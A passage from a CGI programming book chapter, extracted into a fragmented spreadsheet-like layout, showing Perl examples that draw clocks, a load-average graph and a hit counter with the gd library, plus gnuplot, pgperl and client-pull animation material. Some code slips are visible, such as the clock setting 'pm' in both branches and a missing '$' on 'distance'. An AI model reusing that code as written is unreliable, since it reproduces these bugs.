Figure 6.3: PostScript analog clock,"[Graphic: 
  
 Figure 6-3]",NA
"As you can see from the PostScript examples that were presented, PostScript contains a lot of very powerful ",NA,NA
"operators for creating and manipulating graphic images. However, you need to do a lot of work (and write complex ",NA,NA
"code) to use PostScript effectively. In the next few sections, we will look at several other tools that will allow us to ",NA,NA
"create dynamic images. These tools can't match the power of PostScript, but are easier to use and master.",NA,NA
Creating Dynamic Home,NA,NA
Pages,NA,NA
The ,NA,NA
gd,NA,NA
 Graphics Library,NA,NA
6.3 The ,NA,NA
gd,NA,NA
 Graphics Library,NA,NA
The ,NA,NA
gd,NA,NA
" graphics library, though not as powerful as PostScript, allows us to quickly and easily create dynamic ",NA,NA
"images. One of the major advantages of this library is that it can be used directly from Perl, Tcl, and C; there is no ",NA,NA
"need to invoke another application to interpret and produce graphic images. As a result, the CGI programs we write ",NA,NA
will not tax the system anywhere near as those in the previous section (which needed to call GhostScript). Other ,NA,NA
major advantages of the ,NA,NA
gd,NA,NA
 library are the functions that allow you to cut and paste from existing images to create ,NA,NA
new ones.,NA,NA
The ,NA,NA
gd,NA,NA
" library was written by Thomas Boutell for the Quest Protein Database Center of Cold Spring Harbor Labs, ",NA,NA
"and has been ported to Tcl by Spencer Thomas, and to Perl version 5.0 by Lincoln Stein and Roberto Cecchini. ",NA,NA
There are ports of ,NA,NA
gd,NA,NA
" for Perl 4.0 as well, but they are not as elegant, because they require us to communicate ",NA,NA
"through pipes. So, we will use Stein's Perl 5.0 port for the examples in this book.",NA,NA
"Appendix E, ",NA,NA
"Applications, Modules, Utilities, and Documentation",NA,NA
 lists URLs from which you can retrieve the ,NA,NA
gd ,NA,NA
libraries for various platforms.,NA,NA
Digital Clock,NA,NA
"Here is an example of a digital clock, which is identical to the PostScript version in functionality. However, the ",NA,NA
manner in which it is implemented is totally different. This program loads the ,NA,NA
gd,NA,NA
" graphics library, and uses its ",NA,NA
functions to create the image.,NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use GD; ,NA,NA
$| = 1; ,NA,NA
"print ""Content-type: image/gif"", ""\n\n"";",NA,NA
"In Perl 5.0, external modules, such as ",NA,NA
gd,NA,NA
", can be ""included"" into a program with the ",NA,NA
use,NA,NA
 statement. Once the module ,NA,NA
"is included, the program has full access to the functions within it.",NA,NA
"($seconds, $minutes, $hour) = localtime (time); ",NA,NA
if ($hour > 12) {,NA,NA
 $hour -= 12;,NA,NA
" $ampm = ""pm""; ",NA,NA
} else {,NA,NA
" $ampm = ""pm""; ",NA,NA
} ,NA,NA
if ($hour == 0) {,NA,NA
 $hour = 12; ,NA,NA
} ,NA,NA
"$time = sprintf (""%02d:%02d:%02d %s"", $hour, $minutes, $seconds, $ampm); ",NA,NA
$time_length = length($time); ,NA,NA
$font_length = 8; ,NA,NA
$font_height = 16;,NA,NA
$x = $font_length * $time_length;,NA,NA
$y = $font_height;,NA,NA
"Unlike the analog clock PostScript example, we will actually calculate the size of the image based on the length of ",NA,NA
the string stored in the variable ,NA,NA
$time,NA,NA
. The reason we didn't elect to do this in the PostScript version is because ,NA,NA
"Times-Roman is not a constant-width font, and so we would have to do numerous calculations to determine the exact ",NA,NA
dimensions of our dynamic image. But with ,NA,NA
gd,NA,NA
", there are only a few constant-width fonts, so we can calculate the ",NA,NA
size of the image rather easily.,NA,NA
We use the ,NA,NA
length,NA,NA
" function to determine the length (i.e., the number of characters) of the string stored in ",NA,NA
$time,NA,NA
. The ,NA,NA
"image length is calculated by multiplying the font length with the string length. The font we will use is gdLarge, ",NA,NA
which is an 8x16 constant-width font.,NA,NA
"$image = new GD::Image ($x, $y);",NA,NA
"Images are ""created"" by calling the method ",NA,NA
Image,NA,NA
" within the GD class, which creates a new instance of the object. ",NA,NA
"For readers not familiar with object-oriented languages, here is what the statement means:",G,NA
The ,NA,NA
new,NA,NA
 keyword causes space to be allocated for the image.,"G 
  
 G",NA
"The GD is the class, which means what kind of object we're making (it happens to have the same name as the ",NA,NA
package we loaded with the ,NA,NA
use,NA,NA
 statement).,NA,NA
Within that class is a function (or method) called ,NA,NA
Image,NA,NA
", which takes two arguments.",NA,NA
"Note that the whole statement creating an image ends up returning a handle, which we store in ",NA,NA
$image,NA,NA
". Now, ",NA,NA
"following traditional object-oriented practice, we can call functions that are associated with an object method, which ",NA,NA
operates on the object. You'll see that below.,NA,NA
The dimensions of the image are passed as arguments to the ,NA,NA
Image,NA,NA
 method. An important difference between ,NA,NA
PostScript and ,NA,NA
gd,NA,NA
 with regard to drawing is the location of the origin. In ,NA,NA
gd,NA,NA
", the origin is located in the upper-left ",NA,NA
"corner, compared to the lower-left corner for PostScript.",NA,NA
"$black = $image->colorAllocate (0, 0, 0);",NA,NA
"$red = $image->colorAllocate (255, 0, 0);",NA,NA
"The -> part of the function is another object-oriented idea. When you set a color, you naturally have to specify what ",NA,NA
"you're coloring. In object-oriented programming, ",NA,NA
$image,NA,NA
 is the object and you tell that object to execute the method. ,NA,NA
So ,NA,NA
$image->colorAllocate,NA,NA
" is Perl 5.0's way of saying, ""color the object denoted by ",NA,NA
$image,NA,NA
"."" The three arguments ",NA,NA
that the ,NA,NA
colorAllocate,NA,NA
" method expects are the red, blue, and green indices in the range 0--255.",NA,NA
"The first color that we allocate automatically becomes the background color. In this case, the image will have a ",NA,NA
black background.,NA,NA
"$image->string (gdLargeFont, 0, 0, $time, $red);",NA,NA
print $image->gif;,NA,NA
exit(0);,NA,NA
The ,NA,NA
string,NA,NA
" method displays text at a specific location on the screen with a certain font and color. In our case, the ",NA,NA
time string is displayed using the red large font at the origin. The most important statement in this entire program is ,NA,NA
the ,NA,NA
print,NA,NA
" statement, which calls the ",NA,NA
gif,NA,NA
 method to display the drawing in GIF format to standard output.,NA,NA
You should have noticed some major differences between PostScript and ,NA,NA
gd,NA,NA
. PostScript has to be run through an ,NA,NA
"interpreter to produce GIF output, while ",NA,NA
gd,NA,NA
 can be smoothly intermixed with Perl. The origin in PostScript is located ,NA,NA
"in the lower-left corner, while ",NA,NA
gd,NA,NA
"'s origin is the upper left corner. And most importantly, simple images can be ",NA,NA
created in ,NA,NA
gd,NA,NA
 much more easily than in PostScript; PostScript should be used for creation of complex images only.,NA,NA
System Load Average,NA,NA
"The example below graphs the system load average of the system, and is identical to the PostScript version ",NA,NA
"presented earlier in the chapter. As you look at this example, you will notice that ",NA,NA
gd,NA,NA
 makes image creation and ,NA,NA
manipulation very easy.,NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use GD; ,NA,NA
$| = 1; ,NA,NA
"print ""Content-type: image/gif"", ""\n\n""; ",NA,NA
$max_length = 175; ,NA,NA
"$image = new GD::Image ($max_length, $max_length); ",NA,NA
"$white = $image->colorAllocate (255, 255, 255); ",NA,NA
"$red = $image->colorAllocate (255, 0, 0); ",NA,NA
"$blue = $image->colorAllocate (0, 0, 255);",NA,NA
"The image is defined to be 175x175 pixels with a white background. We also allocate two other colors, red and blue.",NA,NA
"@origin = (30, 140);",NA,NA
"This is a two-element array that holds the coordinates for the origin, or lower-left corner, of the graph. Since the ",NA,NA
natural origin is defined to be the upper-left corner in ,NA,NA
gd,NA,NA
", the point (30, 140) is identical to the (30, 30) origin in the ",NA,NA
"PostScript version. Of course, this is assuming the dimensions of the image are 175x175 pixels.",NA,NA
"$image->string (gdLargeFont, 12, 15, ""System Load Average"", $blue); ",NA,NA
"$image->line (@origin, 105 + $origin[0], $origin[1], $blue); ",NA,NA
"$image->line (@origin, $origin[0], $origin[1] - 105, $blue);",NA,NA
We're using the ,NA,NA
string,NA,NA
" method to display a blue string ""System Load Average"" at coordinate (12, 15) using the ",NA,NA
"gdLarge font. We then draw two blue lines, one horizontal and one vertical, from the ""origin"" whose length is 105 ",NA,NA
pixels. Notice that a two-element array is passed to the ,NA,NA
line,NA,NA
" method, instead of two separate values. The main reason ",NA,NA
"for storing the ""origin"" in an array is that it is used repeatedly throughout the program. Whenever you use any piece ",NA,NA
"of data multiple times, it is always a good programming technique to store that information in a variable.",NA,NA
for ($y_axis=0; $y_axis <= 100; $y_axis = $y_axis + 10) {,NA,NA
" $image->line (  $origin[0] - 5, ",NA,NA
" $origin[1] - $y_axis,",NA,NA
" $origin[0] + 5,",NA,NA
" $origin[1] - $y_axis,",NA,NA
 $blue  ); ,NA,NA
} ,NA,NA
for ($x_axis=0; $x_axis <= 100; $x_axis = $x_axis + 25) {,NA,NA
" $image->line ( $x_axis + $origin[0],",NA,NA
" $origin[1] - 5,",NA,NA
" $x_axis + $origin[0],",NA,NA
" $origin[1] + 5,",NA,NA
 $blue ); ,NA,NA
},NA,NA
These two ,NA,NA
for,NA,NA
" loops draw the tick marks on the y and x axes, respectively. The only difference between these loops ",NA,NA
and the ones used in the PostScript version of this program is that the origin is used repeatedly when drawing the ,NA,NA
ticks because ,NA,NA
gd,NA,NA
 lacks a function to draw lines relative to the current point (such as ,NA,NA
rlineto,NA,NA
 in PostScript).,NA,NA
$uptime = `/usr/ucb/uptime`; ,NA,NA
($load_averages) = ($uptime =~ /average: (.*)$/); ,NA,NA
"@loads[0..2] = split(/,\s/, $load_averages);",NA,NA
for ($loop=0; $loop <= 2; $loop++) {,NA,NA
 if ($loads [$loop]>10) {,NA,NA
 $loads[$loop]=10;,NA,NA
 } ,NA,NA
},NA,NA
We store the system load averages in the ,NA,NA
@loads,NA,NA
 array.,NA,NA
$polygon = new GD::Polygon;,NA,NA
An instance of a ,NA,NA
Polygon,NA,NA
 object is created to draw a polygon with the vertices representing the three load average ,NA,NA
values. Drawing a polygon is similar in principle to creating a closed path with several points.,NA,NA
$polygon->addPt (@origin); ,NA,NA
for ($loop=1; $loop <= 3; $loop++) {,NA,NA
" $polygon->addPt (    $origin[0] + (25 * $loop), ",NA,NA
 $max_length - ($loads[$loop - 1] * 10)  ); } ,NA,NA
"$polygon->addPt (100 + $origin[0], $origin[1]);",NA,NA
We use the ,NA,NA
addPt,NA,NA
" method to add a point to the polygon. The origin is added as the first point. Then, each load ",NA,NA
"average coordinate is calculated and added to the polygon. To ""close"" the polygon, we add a final point on the x ",NA,NA
axis.,NA,NA
"$image->filledPolygon ($polygon, $red); ",NA,NA
print $image->gif; ,NA,NA
exit(0);,NA,NA
The ,NA,NA
filledPolygon,NA,NA
 method fills the polygon specified by the ,NA,NA
$polygon,NA,NA
" object with solid red. And finally, the entire ",NA,NA
drawing is printed out to standard output with the ,NA,NA
gif,NA,NA
 method.,NA,NA
Analog Clock,NA,NA
Remember how PostScript allows us to rotate the coordinate system? The PostScript version of the analog clock ,NA,NA
"depended on this rotation ability to draw the ticks on the clock. Unfortunately, ",NA,NA
gd,NA,NA
 doesn't have functions for ,NA,NA
"performing this type of manipulation. As a result, we use different algorithms in this program to draw the clock.",NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use GD; ,NA,NA
$| = 1; ,NA,NA
"print ""Content-type: image/gif"", ""\n\n""; ",NA,NA
$max_length = 150; ,NA,NA
$center = $radius = $max_length / 2; ,NA,NA
"@origin = ($center, $center); ",NA,NA
$marker = 5; ,NA,NA
$hour_segment = $radius * 0.50; ,NA,NA
$minute_segment = $radius * 0.80; ,NA,NA
"$deg_to_rad = (atan2 (1,1) * 4)/180; ",NA,NA
"$image = new GD::Image ($max_length, $max_length);",NA,NA
The ,NA,NA
@origin,NA,NA
 array contains the coordinates that represent the center of the image. In the PostScript version of this ,NA,NA
"program, we translated (or moved) the origin to be at the center of the image. This is not possible with ",NA,NA
gd,NA,NA
.,NA,NA
"$black = $image->colorAllocate (0, 0, 0); ",NA,NA
"$red = $image->colorAllocate (255, 0, 0); ",NA,NA
"$green = $image->colorAllocate (0, 255, 0);",NA,NA
"$blue = $image->colorAllocate (0, 0, 255);",NA,NA
"We create an image with a black background. The image also needs the red, blue, and green colors to draw the ",NA,NA
various parts of the clock.,NA,NA
"($seconds, $minutes, $hour) = localtime (time); ",NA,NA
$hour_angle = ($hour + ($minutes / 60) - 3) * 30 * $deg_to_rad; ,NA,NA
$minute_angle = ($minutes + ($seconds / 60) - 15) * 6 * $deg_to_rad; ,NA,NA
"$image->arc (@origin, $max_length, $max_length, 0, 360, $blue);",NA,NA
"Using the current time, we calculate the angles for the hour and minute hands of the clock. We use the ",NA,NA
arc,NA,NA
 method to ,NA,NA
"draw a blue circle with the center at the ""origin"" and a diameter of ",NA,NA
max_length,NA,NA
.,NA,NA
for ($loop=0; $loop < 360; $loop = $loop + 30) { ,NA,NA
local ($degrees) = $loop * $deg_to_rad; ,NA,NA
"$image->line ($origin[0] + (($radius - $marker) * cos ($degrees)),",NA,NA
" $origin[1] + (($radius - $marker) * sin ($degrees)),",NA,NA
" $origin[0] + ($radius * cos ($degrees)),",NA,NA
" $origin[1] + ($radius * sin ($degrees)),",NA,NA
 $red);,NA,NA
This loop draws the ticks representing the twelve hours on the clock. Since ,NA,NA
gd,NA,NA
" lacks the ability to rotate the axes, we ",NA,NA
need to calculate the coordinates for these ticks. The basic idea behind the loop is to draw a red line from a point five ,NA,NA
pixels away from the edge of the circle to the edge.,NA,NA
"$image->line ( @origin,",NA,NA
" $origin[0] + ($hour_segment * cos ($hour_angle)), ",NA,NA
 ,NA,NA
"$origin[1] + ($hour_segment * sin ($hour_angle)),",NA,NA
 ,NA,NA
$green  );,NA,NA
"$image->line (   @origin,",NA,NA
" $origin[0] + ($minute_segment * cos ($minute_angle)),",NA,NA
" $origin[1] + ($minute_segment * sin ($minute_angle)),",NA,NA
 $green  );,NA,NA
"Using the angles that we calculated earlier, we proceed to draw the hour and minute hands with the ",NA,NA
line,NA,NA
 method.,NA,NA
"$image->arc (@origin, 6, 6, 0, 360, $red); ",NA,NA
"$image->fill ($origin[0] + 1, $origin[1] + 1, $red); ",NA,NA
print $image->gif; ,NA,NA
exit(0);,NA,NA
"We draw a red circle with a radius of 6 at the center of the image and fill it. Finally, the GIF image is output with the ",NA,NA
gif,NA,NA
 method.,NA,NA
Graphic Counter,NA,NA
"Now for something different! In the last chapter, we created a counter to display the number of visitors accessing a ",NA,NA
"document. However, that example lacked file locking, and displayed the counter as text value. Now, let's look at the ",NA,NA
following CGI program that uses the ,NA,NA
gd,NA,NA
 graphics library to create a graphic counter. You can include the graphic ,NA,NA
"counter in your HTML document with the <IMG> tag, as described earlier in this chapter.",NA,NA
What is file locking? Perl offers a function called ,NA,NA
flock,NA,NA
", which stands for ""file lock,"" and uses the underlying UNIX ",NA,NA
call of the same name. You simply call ,NA,NA
flock,NA,NA
 and pass the name of the file handle like this:,NA,NA
"flock (FILE, 2);",NA,NA
This call grants you the exclusive right to use the file. If another process (such as another instance of your own ,NA,NA
"program) is currently locking the file, your program just waits until the file is free. Once you've got the lock, you can ",NA,NA
"safely do anything you want with the file. When you're finished with the file, issue the following call:",NA,NA
"flock (FILE, 8);",NA,NA
"Other values are possible besides 2 and 8, but these are the only ones you need. Others are useful when you have ",NA,NA
lots of processes reading a file and you rarely write to it; it's nice to give multiple processes access so long as ,NA,NA
nobody is writing.,NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use GD; ,NA,NA
$| = 1; ,NA,NA
"$webmaster = ""shishir\@bu\.edu""; ",NA,NA
$exclusive_lock = 2; ,NA,NA
$unlock_lock = 8; ,NA,NA
"$counter_file =  ""/usr/local/bin/httpd_1.4.2/count.txt""; ",NA,NA
$no_visitors = 1;,NA,NA
"You might wonder why a MIME content type is not output at the start of the program, as it was in all of the previous ",NA,NA
"programs. The reason is that file access errors could occur, in which case an error message (in text or HTML) has to ",NA,NA
be output.,NA,NA
if (! (-e $counter_file)) {,NA,NA
" if (open (COUNTER, "">"" . $counter_file)) {",NA,NA
" flock (COUNTER, $exclusive_lock);",NA,NA
 print COUNTER $no_visitors;,NA,NA
" flock (COUNTER, $unlock_lock);",NA,NA
 close (COUNTER);,NA,NA
 } else {,NA,NA
" &return_error (500, ""Counter Error"", ""Cannot create data file to store ",NA,NA
"counter information.""); ",NA,NA
},NA,NA
The ,NA,NA
-e,NA,NA
" operator checks to see whether the counter file exists. If the file does not exist, the program will try to create ",NA,NA
"one using the "">"" character. If the file cannot be created, we call the ",NA,NA
return_error,NA,NA
 subroutine (shown in Chapter 4) to ,NA,NA
"return an error message (subroutines are executed by prefixing an ""&"" to the subroutine name). However, if a file can ",NA,NA
"be created, the ",NA,NA
flock,NA,NA
" command locks the counter file exclusively, so that no other processes can access it. The value ",NA,NA
stored in ,NA,NA
$no_visitors,NA,NA
" (in this case, a value of 1) is written to the file. The file is unlocked, and closed. It is always ",NA,NA
good practice to close files once you're done with them.,NA,NA
} else {,NA,NA
 if (! ((-r $counter_file) && (-w $counter_file)) ) {,NA,NA
" &return_error (500, ""Counter Error"",",NA,NA
" ""Cannot read or write to the counter data file."");",NA,NA
"If the program cannot read or write to the file, we call the ",NA,NA
return_error,NA,NA
 subroutine with a specific message.,NA,NA
 } else {,NA,NA
" open (COUNTER, ""<"" . $counter_file); ",NA,NA
"flock (COUNTER, $exclusive_lock); ",NA,NA
$no_visitors = <COUNTER>;,NA,NA
" flock (COUNTER, $unlock_lock);",NA,NA
 close (COUNTER);,NA,NA
"If the file exists, and we can read and write to it, the counter file is opened for input (as specified by the ""<"" symbol).",NA,NA
"The file is locked, and a line is read using the <COUNTER>notation. Then, we unlock the file and close it.",NA,NA
},NA,NA
 },NA,NA
 $no_visitors++;,NA,NA
" open (COUNTER, "">"" . $counter_file);",NA,NA
" flock (COUNTER, $exclusive_lock);",NA,NA
 print COUNTER $no_visitors;,NA,NA
" flock (COUNTER, $unlock_lock);",NA,NA
 close (COUNTER);,NA,NA
"We increment the counter, open the file for output, and write the new information to the file.",NA,NA
 &graphic_counter(); ,NA,NA
exit(0);,NA,NA
We call the ,NA,NA
graphic_counter,NA,NA
 subroutine and exit. This subroutine creates the image and outputs it to standard output.,NA,NA
This is the end of the program. We will now look at the subroutines. Subroutines should be placed at the end of the ,NA,NA
main program for clarity.,NA,NA
sub graphic_counter ,NA,NA
{ ,NA,NA
" local ( $count_length, $font_length, $font_height, $distance,",NA,NA
 ,NA,NA
"$border, $image_length, $image_height, $image, $black, $blue, $red,",NA,NA
 ,NA,NA
"$loop, $number, $temp_x);",NA,NA
All the variables used exclusively within this subroutine are defined as local variables. These variables are ,NA,NA
meaningful only within the subroutine; you can't set or retrieve their values in the rest of the program. They are not ,NA,NA
"available once the subroutine has finished executing. It is not mandatory to define local variables, but it is ",NA,NA
considered good programming practice.,NA,NA
 $count_length = length ($no_visitors);,NA,NA
 $font_length = 8;,NA,NA
 $font_height = 16;,NA,NA
We use the ,NA,NA
length,NA,NA
 function to determine the length of the string that represents the visitor count. This might be ,NA,NA
"slightly confusing if you are used to working with other programming languages, where you can obtain only the ",NA,NA
"length of a string, and not a numerical value. In this case, Perl converts the number to a string automatically and ",NA,NA
determines the length of that string. This is one of the more powerful features of Perl; strings and numbers can be ,NA,NA
intermixed without any harmful consequences. This length and the font length and height are used to calculate the ,NA,NA
size of the image.,NA,NA
 $distance = 3;,NA,NA
 $border = 4;,NA,NA
The ,NA,NA
$distance,NA,NA
" variable represents the number of pixels (or distance) from one character to the other in our image, ",NA,NA
and ,NA,NA
$border,NA,NA
 is the sum of the length from the left edge to the first character and from the last character to the right ,NA,NA
edge. The graphics counter is illustrated in ,NA,NA
Figure 6.4,NA,NA
.,NA,NA
Figure 6.4: Counter with variables marked,"[Graphic: 
  
 Figure 6-4]",NA
"Now, let's continue with the rest of the program.",NA,NA
 $image_length = ($count_length * $font_length) + ,NA,NA
 (($count_length - 1) * distance) + $border; ,NA,NA
$image_height = $font_height + $border;,NA,NA
" $image = new GD::Image ($image_length, $image_height);",NA,NA
The length and height of the image are determined taking into account the number of characters that represent the ,NA,NA
"counter, the font length, and the distance between characters and the border. We then create a new image with the ",NA,NA
calculated dimensions:,NA,NA
" $black = $image->colorAllocate (0, 0, 0);",NA,NA
" $blue = $image->colorAllocate (0, 0, 255);",NA,NA
" $red = $image->colorAllocate (255, 0, 0);",NA,NA
" $image->rectangle (0, 0, $image_length - 1, $image_height - 1, $blue);",NA,NA
The image consists of a black background with red text and blue lines separating the characters. We also draw a blue ,NA,NA
"rectangle around the entire image. To reiterate, the ",NA,NA
border,NA,NA
 variable represents the sum of the number of pixels from ,NA,NA
this rectangle to the characters on both sides of the image.,NA,NA
 for ($loop=0; $loop <= ($count_length - 1); $loop++) {,NA,NA
 ,NA,NA
"$number = substr ($no_visitors, $loop, 1);",NA,NA
"This loop iterates through each character of the counter string, prints the character, and draws a line separating each ",NA,NA
"one. Of course, the separating lines will be drawn only if the length of the counter string is more than one--in other ",NA,NA
"words, if the number of visitors is greater than or equal to 10. The ",NA,NA
substr,NA,NA
 function returns one character (as specified ,NA,NA
by the third argument) each time through the loop.,NA,NA
 if ($count_length > 1) {,NA,NA
 $temp_x = ($font_length + $distance) * ($loop + 1);,NA,NA
 },NA,NA
" $image->line (  $temp_x,",NA,NA
" 0,",NA,NA
" $temp_x,",NA,NA
" $image_height, ",NA,NA
$blue  );,NA,NA
We draw a blue line separating each character. The x coordinate corresponding to the line is calculated using the ,NA,NA
"font length, the character position, and the distance between characters. Basically, we leave enough space to hold a ",NA,NA
character (that's what ,NA,NA
$font_length,NA,NA
 is for) plus the space between characters (that's what ,NA,NA
$distance,NA,NA
 is for).,NA,NA
" $image->char ( gdLargeFont, ",NA,NA
 ($border / 2) + ($font_length * $loop) + ,NA,NA
" ($loop * $distance),",NA,NA
" $distance, ",NA,NA
" $number, ",NA,NA
 $red  );,NA,NA
 },NA,NA
We use the ,NA,NA
char,NA,NA
 method to output each successive character every time through the loop. The x coordinate is ,NA,NA
"calculated using the border, the font length, the character position, and the distance between characters. We could ",NA,NA
have used the ,NA,NA
string,NA,NA
" method to output the character, but since we're dealing with only one character at a time, it is ",NA,NA
better to use a method created for such a purpose.,NA,NA
" print ""Content-type: image/gif"", ""\n\n""; ",NA,NA
print $image->gif;,NA,NA
} ,NA,NA
"Finally, we output the MIME content type, print the GIF graphic data, and exit.",NA,NA
CGI Examples with,NA,NA
PostScript,NA,NA
CGI Examples with gnuplot,NA,NA
6.4 CGI Examples with gnuplot,"gnuplot
  is a software application suited for graphing simple numerical information. It has the ability to take raw data and 
 create various types of graphs, including point and line graphs and histograms. Let's take a look at an example that illustrates 
 the ease with which we can produce graphs, especially when compared to PostScript and the 
 gd
  graphics library.
  
 You can get 
 gnuplot
  from 
 ftp://prep.ai.mit.edu/pub/gnu/gnuplot-3.5.tar.gz.",NA
Web Server Accesses,"The following example plots the number of Web server accesses for every hour as a histogram. The program parses through 
 the server log file, keeping track of the accesses for each hour of the day in an array. The information stored in this array is 
 written to a file in a format that 
 gnuplot
  can understand. We then call 
 gnuplot
  to graph the data in the file and output the 
 resulting graphic to a file.
  
 #!/usr/local/bin/perl 
  
 $webmaster = ""shishir\@bu\.edu""; 
  
 $gnuplot  = ""/usr/local/bin/gnuplot""; 
  
 $ppmtogif = ""/usr/local/bin/pbmplus/ppmtogif""; 
  
 $access_log = ""/usr/local/bin/httpd_1.4.2/logs/access_log"";
  
 The 
 gnuplot
  utility, as of version v3.5, cannot produce GIF images, but can output PBM (portable bitmap) format files. 
 We'll use the 
 ppmtogif
  utility to convert the output image from PBM to GIF. The 
 $access_log
  variable points to the NCSA 
 server log file, which we'll parse.
  
 $process_id = $$; 
  
 $output_ppm = join ("""", ""/tmp/"", $process_id, "".ppm""); 
 $datafile = join ("""", ""/tmp/"", $process_id, "".txt"");
  
 These variables are used to store the temporary files. The 
 $$
  variable refers to the number of the process running this 
 program, as it does in a shell script. I don't care what process is running my program, but I can use the number to create a 
 filename that I know will be unique, even if multiple instances of my program run. (Use of the process number for this 
 purpose is a trick that shell programmers have used for decades.) The process identification is prefixed to each filename.
  
 $x 
 = 
 0.6; 
  
 $y 
 = 
 0.6; 
  
 $color = 1; 
  
 The size of the plot is defined to be 60% of the original image in both the x and y directions. All lines in the graph will be 
 red (indicated by a value of 1).
  
 if ( open (FILE, ""<"" . $access_log) ) {
  
  for ($loop=0; $loop < 24; $loop++) {
  
  $time[$loop] = 0;
  
  }
  
 We open the NCSA server access log for input. The format of each entry in the log is:
  
 host rfc931 authuser [DD/Mon/YY:hh:mm:ss] ""request"" status_code bytes",NA
6.5 CGI Examples with pgperl,"gnuplot
  is concise and fun for throwing up a few charts, but for sophisticated plotting you may want a more powerful 
 package called 
 pgperl
 . This is a derivative of Perl that supports the PGPLOT FORTRAN plotting library. Typically it 
 has been used to plot astronomical data, but you can use it to graph any type of data.
  
 You can get 
 pgperl
  from 
 http://www.ast.cam.ac.uk/~kgb/pgperl.html.
  
 What does 
 pgperl
  offer that 
 gnuplot
  doesn't? 
 pgperl
  contains many powerful plotting functions (all beginning with the 
 prefix ""pg""), such as a variety of histograms and mapped contours, which 
 gnuplot
  doesn't have. Another important 
 consideration is that the 
 pgperl
  graphic routines are incorporated straight into Perl, and thus there is no need to work 
 with temporary files or pipes. Let's take a look at a 
 pgperl
  example that graphs the information in the NCSA server log 
 file.",NA
Web Server Accesses,"Here is a 
 pgperl
  program that is similar in functionality to the 
 gnuplot
  example above. It is intended to show you the 
 differences between 
 gnuplot
  and 
 pgperl
 .
  
 #!/usr/local/bin/pgperl 
  
 require ""pgplot.pl"";
  
 $webmaster = ""shishir\@bu\.edu""; 
  
 $access_log = ""/usr/local/bin/httpd_1.4.2/logs/access_log"";
  
 The 
 require
  command includes the 
 pgperl
  header file that consists of various PGPLOT functions.
  
 $hours = 23; 
  
 $maximum = 0;
  
 The 
 $maximum
  variable represents the maximum y coordinate when we plot the histogram. It sets the range on the y 
 axis.
  
 $process_id = $$; 
  
 $output_gif = join ("""", ""/tmp/"", $process_id, "".gif"");
  
 The 
 output_gif
  variable is used to store the name of a temporary file that will contain the GIF image.
  
 if ( (open(FILE, ""<"" . $access_log)) ) {
  
  
  for ($loop=0; $loop <= $hours; $loop++) {
  
  
  $time[$loop] = 0;
  
  
  
  $counter[$loop] = $loop;
  
  }
  
 Two arrays are initialized to hold the hour and access data. The 
 @time
  array holds the number of accesses for each 
 hour, and the 
 @counter
  array represents the hours (0--23).
  
  while (<FILE>){",NA
6.6 Animation,NA,NA
"Although Java is being touted as the best way to do animation on the Web, you can also write CGI programs ",NA,NA
to produce animation. There are two mechanisms for creating animation: client pull and server push. In client ,NA,NA
"pull, a new HTTP connection is opened every time a document is requested. In server push, however, the ",NA,NA
connection is kept open until all the data is received by the client. That is the main difference between the two ,NA,NA
"mechanisms. As a result, you can have an animation in an otherwise static document by using the HTML ",NA,NA
"<IMG> tag to access the CGI program instead of a URL to an image, as introduced in the ""Inserting Multiple ",NA,NA
"Dynamic Images"" section at the beginning of this chapter.",NA,NA
Client pull requires a special directive either in the HTML document header or as a part of the CGI program's ,NA,NA
HTTP response. This directive instructs the client to retrieve a specified document after a certain amount of ,NA,NA
"time. In other words, the client opens a new connection to the server for each updated image (see ",NA,NA
Figure 6.7,NA,NA
).,NA,NA
Figure 6.7: Animation using client pull,"[Graphic: 
  
 Figure 6-7]",NA
"Server push involves sending packets of data to the client periodically, as shown in ",NA,NA
Figure 6.8,NA,NA
. The HTTP,NA,NA
connection between the client and the server is kept open indefinitely. Server push can be implemented in ,NA,NA
a CGI program through the use of the ,NA,NA
multipart/x-mixed-replace,NA,NA
 MIME type.,NA,NA
Both client pull and server push are supported only by Netscape Navigator (version 1.1 and higher) and ,NA,NA
Internet Explorer.,NA,NA
Figure 6.8: Animation using server push,"[Graphic: 
  
 Figure 6-8]",NA
Client Pull,NA,NA
Here is a simple example of an HTML document that displays the time continuously:,NA,NA
"<META HTTP-EQUIV=""Refresh"" CONTENT=5>",NA,NA
"<!--#echo var=""DATE_LOCAL""-->",NA,NA
Animation depends on updating the browser's window at regular intervals with new material from the server. ,NA,NA
Browsers provide a way to update their windows called ,NA,NA
refreshing,NA,NA
". In the example shown above, we trick the ",NA,NA
"browser into issuing its refresh command every five seconds, so that it retrieves the document. The document ",NA,NA
simply uses server side includes to display the current time. (See Chapter 5 for more information on Server ,NA,NA
Side Includes.),NA,NA
The META tag is part of the HTML 3.0 specification used to simulate HTTP response headers in HTML ,NA,NA
"documents. In this case, it is used to simulate the ""Refresh:"" HTTP header with a delay of five seconds.",NA,NA
"The ""Refresh:"" header is non-repeating; it does not load the document repeatedly. However, in this example, ",NA,NA
"""Refresh:"" is specified on each retrieval, creating a continuous display.",NA,NA
Here is an example of a CGI program that performs the same operation as the previous HTML code:,NA,NA
#!/usr/local/bin/perl ,NA,NA
$delay = 5; ,NA,NA
"$date = ""/bin/date""; ",NA,NA
"print ""Refresh: "", $delay, ""\n""; ",NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
print `$date`; ,NA,NA
exit(0);,NA,NA
"Remember, SSI directives cannot be included in a CGI program. So, the ",NA,NA
date,NA,NA
 command is used to output ,NA,NA
the current date and time.,NA,NA
"Now, let's look at the directive used to load a different document after a specified time:",NA,NA
"<META HTTP-EQUIV=""Refresh"" CONTENT=""5; URL=http://your.machine/name.html"">",NA,NA
This example loads the file specified by the URL after five seconds. If the file ,NA,NA
name.html,NA,NA
 does not contain ,NA,NA
"another ""Refresh:"" header, there is no animation, because ""Refresh:"" is non-repeating. The corresponding CGI ",NA,NA
statement would be:,NA,NA
"print ""Refresh: 5; URL=http://your.machine/name.html"", ""\n"";",NA,NA
"As a final example of client pull, here's a CGI program that loads a document with a random fortune message ",NA,NA
every ten seconds.,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$fortune = ""/usr/local/bin/fortune""; ",NA,NA
$refresh_time = 10; ,NA,NA
"print ""Refresh: "", $refresh_time, ""\n""; ",NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
"print ""Here is another fortune..."", ""\n""; ",NA,NA
